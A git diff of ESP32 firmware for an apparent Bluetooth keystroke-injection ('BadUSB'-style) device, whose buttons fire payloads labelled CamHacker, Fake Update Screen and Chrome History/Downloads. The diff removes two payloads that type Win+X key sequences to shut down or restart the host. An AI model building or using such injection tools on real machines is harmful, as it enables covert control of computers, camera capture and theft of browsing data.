@@ -4,8 +4,6 @@
 #define BUTTON_2_PIN 17 // Button 2 (Trigger: Secret Messaging)
 #define BUTTON_3_PIN 18 // Button 3 (Trigger: Fake Update Screen)
 #define BUTTON_4_PIN 19 // Button 4 (Trigger: CamHacker)
-#define BUTTON_5_PIN 21 // Button 5 (Trigger: Shut Down)
-#define BUTTON_6_PIN 22 // Button 6 (Trigger: Restart)
 #define BUTTON_7_PIN 23 // Button 7 (Trigger: Chrome History/Downloads)
 #define BUTTON_8_PIN 25 // Button 8 (Trigger: HiddenWave)
 #define BUTTON_9_PIN 27 // Button 9 (Trigger: CanaryTokensDetector)
@@ -23,8 +21,6 @@ bool lastState1 = HIGH;
 bool lastState2 = HIGH;
 bool lastState3 = HIGH;
 bool lastState4 = HIGH;
-bool lastState5 = HIGH;
-bool lastState6 = HIGH;
 bool lastState7 = HIGH;
 bool lastState8 = HIGH;
 bool lastState9 = HIGH;
@@ -58,8 +54,6 @@ void setup() {
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
   pinMode(BUTTON_3_PIN, INPUT_PULLUP);
   pinMode(BUTTON_4_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_5_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_6_PIN, INPUT_PULLUP);
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
   pinMode(BUTTON_8_PIN, INPUT_PULLUP);
   pinMode(BUTTON_9_PIN, INPUT_PULLUP);
@@ -82,8 +76,6 @@ void loop() {
     bool state2 = digitalRead(BUTTON_2_PIN);
     bool state3 = digitalRead(BUTTON_3_PIN);
     bool state4 = digitalRead(BUTTON_4_PIN);
-    bool state5 = digitalRead(BUTTON_5_PIN);
-    bool state6 = digitalRead(BUTTON_6_PIN);
     bool state7 = digitalRead(BUTTON_7_PIN);
     bool state8 = digitalRead(BUTTON_8_PIN);
     bool state9 = digitalRead(BUTTON_9_PIN);
@@ -175,34 +167,6 @@ void loop() {
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
       Serial.println("CamHacker Payload executed");
-    }
-
-    // Button 5: Shut Down (Pin 21)
-    if (lastState5 == HIGH && state5 == LOW) {
-      Serial.println("Button 5: Shut Down (Pin 21)");
-      bleKeyboard.press(KEY_LEFT_GUI); delay(100);
-      bleKeyboard.releaseAll(); delay(100);
-      bleKeyboard.press('x'); delay(100);
-      bleKeyboard.releaseAll(); delay(100);
-      bleKeyboard.press('u'); delay(100);
-      bleKeyboard.releaseAll(); delay(100);
-      bleKeyboard.press('u'); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      Serial.println("Shut Down Payload executed");
-    }
-
-    // Button 6: Restart (Pin 22)
-    if (lastState6 == HIGH && state6 == LOW) {
-      Serial.println("Button 6: Restart (Pin 22)");
-      bleKeyboard.press(KEY_LEFT_GUI); delay(100);
-      bleKeyboard.releaseAll(); delay(100);
-      bleKeyboard.press('x'); delay(100);
-      bleKeyboard.releaseAll(); delay(100);
-      bleKeyboard.press('u'); delay(100);
-      bleKeyboard.releaseAll(); delay(100);
-      bleKeyboard.press('r'); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      Serial.println("Restart Payload executed");
     }
 
     // Button 7: Chrome History/Downloads (Pin 23)
@@ -439,8 +403,6 @@ void loop() {
     lastState2 = state2;
     lastState3 = state3;
     lastState4 = state4;
-    lastState5 = state5;
-    lastState6 = state6;
     lastState7 = state7;
     lastState8 = state8;
     lastState9 = state9;
@@ -455,4 +417,3 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
-
